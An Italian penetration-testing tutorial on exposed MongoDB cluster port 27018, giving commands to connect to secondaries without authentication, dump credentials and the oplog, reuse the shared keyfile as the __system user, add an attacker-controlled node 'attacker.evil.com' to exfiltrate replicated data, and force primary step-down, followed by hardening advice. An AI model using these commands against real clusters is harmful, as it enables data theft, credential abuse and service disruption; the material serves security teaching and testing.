---
title: 'Porta 27018 MongoDB Cluster: Accesso ai Nodi Interni e Oplog Dump'
slug: porta-27018-mongodb-cluster
description: >-
  Porta 27018 esposta? Connettiti direttamente ai Secondary del replica set,
  leggi l'oplog con password in chiaro, bypassa il keyfile e pivota nei nodi del
  cluster.
image: /porta-27018-mongodb-cluster.webp
draft: false
date: 2026-04-21T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - mongodb
  - replica-set
  - lateral-movement
---

La porta 27018 è la porta interna di comunicazione tra i nodi di un cluster MongoDB. Quando MongoDB opera in modalità **replica set** (alta disponibilità) o **sharded cluster** (distribuzione orizzontale), i nodi si parlano sulla 27018 per sincronizzare i dati, eleggere il primary e instradare le query. Non è pensata per essere raggiunta dai client applicativi — ma quando un pentester la trova esposta, apre un vettore che bypassa completamente le restrizioni configurate sulla [porta 27017](https://hackita.it/articoli/porta-27017-mongodb).

Il motivo è semplice: la comunicazione interna al cluster MongoDB spesso non ha autenticazione separata. Se il sysadmin ha protetto la 27017 con auth e firewall ma ha lasciato la 27018 raggiungibile, puoi connetterti direttamente al membro del replica set e accedere ai dati come se l'auth non esistesse.

## Architettura del Cluster MongoDB

### Replica Set (alta disponibilità)

```
                    Client App
                        │
                        ▼
              ┌─────────────────┐
              │  Primary (:27017)│ ← riceve write
              └────────┬────────┘
                 :27018 │ :27018
          ┌─────────────┼─────────────┐
          ▼             ▼             ▼
┌─────────────┐ ┌─────────────┐ ┌─────────────┐
│ Secondary 1 │ │ Secondary 2 │ │  Arbiter    │
│   (:27018)  │ │   (:27018)  │ │  (:27018)   │
└─────────────┘ └─────────────┘ └─────────────┘
```

Il **Primary** accetta letture e scritture. I **Secondary** replicano i dati dal Primary via porta 27018 (oplog sync). L'**Arbiter** partecipa solo al voto per l'elezione del Primary.

I Secondary hanno una **copia completa di tutti i dati** — se ci accedi, hai tutto.

### Sharded Cluster (distribuzione orizzontale)

```
Client App → mongos router (:27017)
                    │
    ┌───────────────┼───────────────┐
    ▼               ▼               ▼
┌────────┐    ┌────────┐    ┌────────┐
│ Shard 1│    │ Shard 2│    │ Shard 3│
│ (:27018)│   │(:27018)│    │(:27018)│
└────────┘    └────────┘    └────────┘
                    │
              ┌─────┴─────┐
              │Config Srvs│
              │  (:27019)  │
              └────────────┘
```

Ogni **Shard** è un replica set a sé stante che ascolta sulla 27018. I **Config Servers** (porta 27019) contengono i metadati del cluster — quale shard contiene quali dati.

In entrambi i casi, la porta 27018 è il canale di comunicazione interno. In un pentest, trovarla esposta significa accedere direttamente ai nodi del cluster, spesso senza le restrizioni della 27017.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 27017,27018,27019 10.10.10.40-42
```

```
Nmap scan report for 10.10.10.40
PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 6.0.12
27018/tcp open  mongodb MongoDB 6.0.12 (shard)

Nmap scan report for 10.10.10.41
PORT      STATE SERVICE VERSION
27018/tcp open  mongodb MongoDB 6.0.12 (shard)

Nmap scan report for 10.10.10.42
PORT      STATE SERVICE VERSION
27018/tcp open  mongodb MongoDB 6.0.12 (shard)
27019/tcp open  mongodb MongoDB 6.0.12 (config)
```

Tre nodi: .40 è il Primary (ha sia 27017 che 27018), .41 è un Secondary, .42 è Secondary + Config Server.

### Connessione diretta al membro sulla 27018

```bash
mongosh 10.10.10.41:27018
```

```
rs0:SECONDARY>
```

Se ottieni il prompt senza errore di autenticazione → accesso diretto al Secondary senza auth. Tutti i dati del database sono leggibili.

**Nota:** su un Secondary, le letture richiedono un comando esplicito:

```javascript
rs.secondaryOk()
```

Oppure nella versione moderna:

```javascript
db.getMongo().setReadPref("secondary")
```

Senza questo comando, il Secondary rifiuta le query con `not primary and secondaryOk=false`.

### Informazioni sul Replica Set

```javascript
rs.status()
```

```json
{
  "set": "rs0",
  "members": [
    {
      "_id": 0,
      "name": "mongo-01.corp.internal:27018",
      "stateStr": "PRIMARY",
      "health": 1
    },
    {
      "_id": 1,
      "name": "mongo-02.corp.internal:27018",
      "stateStr": "SECONDARY",
      "health": 1
    },
    {
      "_id": 2,
      "name": "mongo-03.corp.internal:27018",
      "stateStr": "SECONDARY",
      "health": 1
    }
  ]
}
```

**Intelligence:** hostname interni di tutti i nodi del cluster. Tre nuovi target con i loro hostname DNS interni (`mongo-01.corp.internal`, ecc.).

```javascript
rs.conf()
```

```json
{
  "_id": "rs0",
  "members": [
    {"_id": 0, "host": "mongo-01.corp.internal:27018", "priority": 10},
    {"_id": 1, "host": "mongo-02.corp.internal:27018", "priority": 5},
    {"_id": 2, "host": "mongo-03.corp.internal:27018", "priority": 1}
  ],
  "settings": {
    "keyFile": "/etc/mongodb/keyfile"
  }
}
```

Se `keyFile` è presente → l'autenticazione interna usa un keyfile condiviso. Se trovi il keyfile su un nodo compromesso, puoi autenticarti su tutti i nodi del cluster.

### Informazioni sugli Shard (cluster sharded)

```javascript
sh.status()
```

```
--- Sharding Status ---
  shards:
    { "_id": "shard01", "host": "shard01/mongo-s1a:27018,mongo-s1b:27018" }
    { "_id": "shard02", "host": "shard02/mongo-s2a:27018,mongo-s2b:27018" }
  databases:
    { "_id": "production", "primary": "shard01", "partitioned": true }
      production.users → shard key: { "region": 1 }
      production.orders → shard key: { "order_date": 1 }
```

Mappa completa: quali database su quali shard, con le shard key (utile per capire la distribuzione dei dati).

## 2. Exploitation — Accesso ai Dati

Se la 27018 è raggiungibile senza autenticazione, le tecniche sono identiche alla [porta 27017](https://hackita.it/articoli/porta-27017-mongodb):

```javascript
rs.secondaryOk()
show dbs
```

```
admin        40.00 KiB
production  500.00 MiB
staging      10.00 MiB
local       150.00 MiB
```

```javascript
use production
show collections
db.users.find({}, {username: 1, password: 1, email: 1, api_key: 1}).limit(10)
```

```javascript
// Dump credenziali
db.users.find({role: "administrator"}).forEach(printjson)
```

```bash
# Dump completo via CLI
mongodump --host 10.10.10.41 --port 27018 --out /tmp/cluster_dump/
```

Per tutte le tecniche di ricerca credenziali, manipolazione dati e exfiltration: vedi la [guida completa porta 27017](https://hackita.it/articoli/porta-27017-mongodb).

### Oplog — La Cronologia di Ogni Modifica

Il database `local` su ogni membro del replica set contiene l'**oplog** (operation log): un registro cronologico di ogni operazione di write eseguita sul cluster.

```javascript
use local
db.oplog.rs.find().sort({$natural: -1}).limit(5)
```

```json
{
  "ts": Timestamp(1705312800, 1),
  "op": "u",
  "ns": "production.users",
  "o": {"$set": {"password": "$2b$10$NEW_HASH"}},
  "o2": {"_id": ObjectId("65a5b...")}
}
```

L'oplog mostra le password cambiate di recente (il campo `o` contiene il nuovo valore), le insert di nuovi utenti e ogni altra modifica. È un audit trail completo che il pentester può analizzare per trovare credenziali passate che potrebbero ancora funzionare su altri servizi (credential reuse).

```javascript
// Cerca nell'oplog operazioni con password
use local
db.oplog.rs.find({
    "ns": "production.users",
    "$or": [
        {"o.password": {$exists: true}},
        {"o.$set.password": {$exists: true}}
    ]
}).sort({$natural: -1}).limit(20)
```

## 3. Keyfile Authentication — Bypass

L'autenticazione interna tra i nodi del cluster MongoDB usa un **keyfile**: un file di testo con un segreto condiviso (base64, 6-1024 caratteri). Tutti i nodi dello stesso cluster hanno lo stesso keyfile.

### Trovare il keyfile

```bash
# Se hai accesso a un nodo (shell)
cat /etc/mongod.conf | grep keyFile
```

```
security:
  keyFile: /etc/mongodb/keyfile
```

```bash
cat /etc/mongodb/keyfile
```

```
abc123def456ghi789jkl012mno345pqr678stu901vwx234
```

### Cercare il keyfile su altri host compromessi

```bash
find / -name "keyfile" -o -name "mongodb-keyfile" -o -name "mongo.key" 2>/dev/null
grep -riE "keyFile" /etc/mongod* /opt/mongo* /var/lib/mongo* 2>/dev/null
```

Il keyfile è spesso distribuito identicamente su tutti i nodi via Ansible, Puppet o copia manuale. Se comprometti un nodo qualsiasi → hai il keyfile per tutti.

### Usare il keyfile per autenticarsi

Con il keyfile, puoi avviare un `mongosh` che si autentica come membro interno del cluster:

```bash
mongosh --host 10.10.10.41 --port 27018 \
  --username __system --password $(cat keyfile) --authenticationDatabase local
```

L'utente `__system` è l'utente interno del cluster con permessi illimitati — accesso completo a tutto.

## 4. Manipolazione del Cluster

### Aggiungere un nodo controllato

Se hai accesso write al Primary con ruolo admin:

```javascript
// Aggiungi il tuo server come membro del replica set
rs.add("attacker.evil.com:27018")
```

Il cluster inizierà a sincronizzare tutti i dati verso il tuo server. Exfiltration completa e continua.

**Attenzione:** questa operazione è molto invasiva e visibile. Solo in ambienti autorizzati.

### Forzare step-down del Primary

```javascript
// Forza il Primary a diventare Secondary (DoS temporaneo)
rs.stepDown(300)  // 300 secondi prima che possa ridiventare Primary
```

### Reconfigurare il replica set

```javascript
// Rimuovi un membro
rs.remove("mongo-03.corp.internal:27018")
```

## 5. Pivoting — Da MongoDB al Resto dell'Infrastruttura

La 27018 esposta rivela la rete interna:

**Hostname interni** da `rs.status()` e `sh.status()` → aggiungi al tuo `/etc/hosts` e scansiona:

```bash
echo "10.10.10.41 mongo-02.corp.internal" >> /etc/hosts
nmap -sV -p- mongo-02.corp.internal
```

**Credenziali in MongoDB** → testa su tutti i servizi scoperti dalla scansione dei nodi del cluster. La [guida porta 27017](https://hackita.it/articoli/porta-27017-mongodb) copre la ricerca di credenziali nelle collection.

**Keyfile** → se il keyfile è debole o riusato, potrebbe essere una password usata anche altrove.

## 6. Detection & Hardening

### Blue Team

```
- La porta 27018 NON deve essere raggiungibile da IP esterni al cluster
- Monitor connessioni alla 27018 da IP diversi dai membri del replica set
- Alert su rs.add() con host non autorizzati
- Audit dell'oplog per accessi anomali
```

### Hardening

* **Firewall rigoroso** — porta 27018 raggiungibile SOLO dagli altri nodi del cluster
* **Keyfile robusto** — genera con `openssl rand -base64 756 > keyfile`
* **Autenticazione interna obbligatoria** — `security.keyFile` in mongod.conf
* **TLS per la replicazione** — `net.tls.mode: requireTLS` anche per il traffico interno
* **Network segmentation** — i nodi MongoDB nella stessa VLAN isolata
* **Bind specifico** — `net.bindIp` con solo gli IP dei nodi del cluster, mai `0.0.0.0`
* **Audit log** — abilita su tutti i nodi, non solo il Primary

## 7. Cheat Sheet Finale

| Azione                    | Comando                                                                                            |
| ------------------------- | -------------------------------------------------------------------------------------------------- |
| Nmap cluster              | `nmap -sV -p 27017,27018,27019 target-range`                                                       |
| Connect al secondary      | `mongosh target:27018`                                                                             |
| Abilita lettura secondary | `rs.secondaryOk()`                                                                                 |
| Status replica set        | `rs.status()`                                                                                      |
| Config replica set        | `rs.conf()`                                                                                        |
| Status shard              | `sh.status()`                                                                                      |
| Leggi oplog               | `use local; db.oplog.rs.find().sort({\$natural:-1}).limit(10)`                                     |
| Cerca password in oplog   | `db.oplog.rs.find({"o.password":{\$exists:true}})`                                                 |
| Dump da secondary         | `mongodump --host target --port 27018 --out /tmp/dump/`                                            |
| Trova keyfile             | `grep -r "keyFile" /etc/mongod*`                                                                   |
| Auth con keyfile          | `mongosh --host target --port 27018 -u __system -p \$(cat keyfile) --authenticationDatabase local` |
| Aggiungi nodo (invasivo)  | `rs.add("attacker:27018")`                                                                         |

***

Riferimento: MongoDB Replica Set documentation, MongoDB Security Checklist, HackTricks MongoDB. Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
